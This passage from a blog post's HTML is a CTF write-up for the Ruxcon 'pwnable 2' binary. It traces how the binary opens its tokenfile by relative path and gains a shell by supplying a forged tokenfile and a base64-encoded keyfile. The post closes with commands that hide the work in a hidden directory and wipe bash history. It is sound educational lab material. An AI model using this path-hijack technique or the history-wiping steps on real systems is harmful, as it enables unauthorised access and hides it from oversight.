+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ pwnable2 ltrace ./level2 ./key1
+__libc_start_main<span class="o">(</span>0x400c00, 2, 0x7ffe6b0f31e8, 0x4017b0 &lt;unfinished …&gt;
+strcmp<span class="o">(</span>“./key1”, “-”<span class="o">)</span> <span class="o">=</span> 1
+fopen<span class="o">(</span>“./key1”, “r”<span class="o">)</span> <span class="o">=</span> 0x2072010
+malloc<span class="o">(</span>1032<span class="o">)</span> <span class="o">=</span> 0x2072250
+__isoc99_fscanf<span class="o">(</span>0x2072010, 0x401834, 0x2072250, 0x2072258<span class="o">)</span> <span class="o">=</span> 2
+malloc<span class="o">(</span>629760<span class="o">)</span> <span class="o">=</span> 0x7f2d3cf19010
+malloc<span class="o">(</span>4104<span class="o">)</span> <span class="o">=</span> 0x2072660
+strcmp<span class="o">(</span>“password”, “XOR”<span class="o">)</span> <span class="o">=</span> 24
+strcmp<span class="o">(</span>“password”, “NOENCRYPT”<span class="o">)</span> <span class="o">=</span> 34
+fprintf<span class="o">(</span>0x7f2d3cdba060, “Invalid Scheme specified.<span class="se">\n</span>”Invalid Scheme specified.
+<span class="o">)</span> <span class="o">=</span> 26
++++ exited <span class="o">(</span>status 1<span class="o">)</span> +++
+
+➜ pwnable2 <span class="nb">echo</span> “123:NOENCRYPT” <span class="o">&gt;</span> key2
+
+➜ pwnable2 ltrace ./level2 ./key2
+__libc_start_main<span class="o">(</span>0x400c00, 2, 0x7ffc0232d358, 0x4017b0 &lt;unfinished …&gt;
+strcmp<span class="o">(</span>“./key2”, “-”<span class="o">)</span> <span class="o">=</span> 1
+fopen<span class="o">(</span>“./key2”, “r”<span class="o">)</span> <span class="o">=</span> 0xc43010
+malloc<span class="o">(</span>1032<span class="o">)</span> <span class="o">=</span> 0xc43250
+__isoc99_fscanf<span class="o">(</span>0xc43010, 0x401834, 0xc43250, 0xc43258<span class="o">)</span> <span class="o">=</span> 2
+malloc<span class="o">(</span>629760<span class="o">)</span> <span class="o">=</span> 0x7efc1ddcd010
+malloc<span class="o">(</span>4104<span class="o">)</span> <span class="o">=</span> 0xc43660
+strcmp<span class="o">(</span>“NOENCRYPT”, “XOR”<span class="o">)</span> <span class="o">=</span> <span class="nt">-10</span>
+strcmp<span class="o">(</span>“NOENCRYPT”, “NOENCRYPT”<span class="o">)</span> <span class="o">=</span> 0
+strcpy<span class="o">(</span>0xc43668, “No Encryption”<span class="o">)</span> <span class="o">=</span> 0xc43668
+__isoc99_fscanf<span class="o">(</span>0xc43010, 0x401962, 0x7efc1ddcd010, 0x7efc1ddcd010<span class="o">)</span> <span class="o">=</span> 0xffffffff
+fprintf<span class="o">(</span>0x7efc1dc6e060, “In.correct number of entries. Exp”…, 123, 0Incorrect number of entries. Expected 123 but found 0
+<span class="o">)</span> <span class="o">=</span> 54
++++ exited <span class="o">(</span>status 1<span class="o">)</span> +++
+</code></pre></div></div>
+
+<p>Now we’re getting the message: “Incorrect number of entries. Expected 123 but found 0”. Looks like that number we pass in is some kind of counter. Apparently our keyfile contains zero entries, let’s try adding stuff to the keyfile. Adding the line “password” changes the message to “Incorrect number of entries. Expected 123 but found 1”, looks like the number we pass in is a counter for the number of lines in the keyfile.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ pwnable2 <span class="nb">echo</span> “0:NOENCRYPT<span class="se">\n</span>password” <span class="o">&gt;</span> key3
+
+➜ pwnable2 ./level2 ./key3
+Incorrect number of entries. Expected 123 but found 1
+
+➜ pwnable2 <span class="nb">echo</span> “1:NOENCRYPT<span class="se">\n</span>password” <span class="o">&gt;</span> key3
+
+➜ pwnable2 ./level2 ./key3
+</code></pre></div></div>
+
+<p>Awesome! Sort of … nothing actually happens and we clearly haven’t pwned anything, nor is it raining shellz. Let’s break out IDA to work out how we’re actually going to break this thing.</p>
+
+<p>Once the binary is loaded and disassembled, jump into the strings window (<code class="highlighter-rouge">SHIFT+F12</code>). We’re assuming that we want to properly authenticate with the binary so let’s trace where the following string is used: “Congratulations. You’re authenticated!” Double click the string, this will jump to a table in the .rodata section, use Ctrl+x to find cross-references to the string, there’s only one in this instance.</p>
+
+<p><img src="/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-2.png" alt="IDA Strings" /></p>
+
+<p>So if we authenticate correctly, we get a shell. It sure looks like we’re in the right place. But we can’t read the token file! If we can’t read the token file it’s going to be real difficult to construct a valid keyfile.</p>
+
+<p><img src="/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-3.png" alt="We want to get to here" /></p>
+
+<p>If we drill down into the <code class="highlighter-rouge">token_from_file</code> function we find the following interesting code block. There it is! It looks like the program is opening the tokenfile from a relative path rather than an absolute one. We can totally abuse this!</p>
+
+<p><img src="/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-4.png" alt="Relative path to tokenfile" /></p>
+
+<p>I forgot to take screenshots during the actual competition but permissions on the tokenfile were such that the user running the level2 binary wasn’t able to read the tokenfile, but they <em>did</em> allow us to move the binary. Because the tokenfile is being opened from <code class="highlighter-rouge">./tokenfile</code>, if we move the binary to somewhere like <code class="highlighter-rouge">/tmp</code> and create our own token file, we should be able to authenticate successfully. Let’s test that theory!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ /tmp <span class="nb">echo</span> <span class="nt">-n</span> “1:NOENCRYPT<span class="se">\n</span>winning” <span class="o">&gt;</span> key5
+
+➜ /tmp <span class="nb">echo</span> <span class="nt">-n</span> “winning” <span class="o">&gt;</span> tokenfile
+
+➜ /tmp ./level2 ./key5
+Key entry too large.
+</code></pre></div></div>
+
+<p>Looks like we’ve missed something. Let’s find the message “Key entry too large” in IDA.</p>
+
+<p><img src="/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-5.png" alt="base64_decode call" /></p>
+
+<p>If the comparison fails and the branch isn’t taken the program prints “Key entry too large” and exits. This comparison seems to be comparing a variable to -1 directly after a base64 decode operation. Following the flow in IDA, there are 3 paths from this point. Either the program prints “Key entry too large”, “Incorrectly encoded entry” or it proceeds to the <code class="highlighter-rouge">try_authenticate</code> function. If we break in GDB at the point where <code class="highlighter-rouge">base64_decode</code> is called we see a pointer (0x602660) to our keyfile entry, “winning”, being passed as an argument.</p>
+
+<p><img src="/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-6.png" alt="&quot;winning&quot;" /></p>
+
+<p>Decoding “winning” as base64 will clearly fail so perhaps we need to encode our input. Also note that because the binary isn’t stripped, we can see the name of the original source file at the point where GDB breaks: <code class="highlighter-rouge">authenticate_with_keyfile_b64dec.c</code>. Sounds good, let’s try it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ /tmp <span class="nb">echo</span> “1:NOENCRYPT” <span class="o">&gt;</span> key6
+
+➜ /tmp <span class="nb">echo</span> <span class="nt">-n</span> “winning” | <span class="nb">base64</span> <span class="o">&gt;&gt;</span> key6
+
+➜ /tmp ./level2 ./key6
+<span class="c">#</span>
+
+<span class="c"># cd /home/level2</span>
+
+<span class="c"># ls</span>
+level2 tokenfile
+
+<span class="c"># cat tokenfile</span>
+RUX<span class="o">{</span>not_the_actual_flag_but_you_still_win<span class="o">}</span>
+
+<span class="c"># exit</span>
+Congratulations. You’re authenticated
+
+➜ /tmp
+</code></pre></div></div>
+
+<p>BOOM, we get a shell, change back to the challenge directory and we can read the tokenfile which contains the original flag (I’m afraid I don’t remember the actual flag).
+We didn’t explore the XOR function but evidentially we didn’t need it to solve the challenge. Perhaps as the subject of a follow-up post.</p>
+
+<p>As a final note, this challenge was hosted on a server accessible by all teams. That means that anyone watching the bash history can see what you’re doing, making it a delicate operation to solve the challenge without revealing your methods. As a minimum, I’d recommend creating a hidden folder, working from there, then deleting the bash history.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ pwnable2 <span class="nb">mkdir</span> /.fd788743c5e54c528a6088c650cf8a9d
+
+➜ pwnable2 <span class="nb">cp </span>level2 /.fd788743c5e54c528a6088c650cf8a9d
+
+&lt;pwn all the things&gt;
+
+➜ pwnable2 <span class="nb">history</span> <span class="nt">-c</span>
+
+➜ pwnable2 <span class="nb">cat</span> /dev/null <span class="o">&gt;</span> ~/.bash_history
+</code></pre></div></div>
+
+<p>You know … just to be sure.</p>
+
+<p>Happy hunting.</p>
+
+  </div>
+
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy; x86party - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://blog.x86.party/feed.xml">RSS</a>
+
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
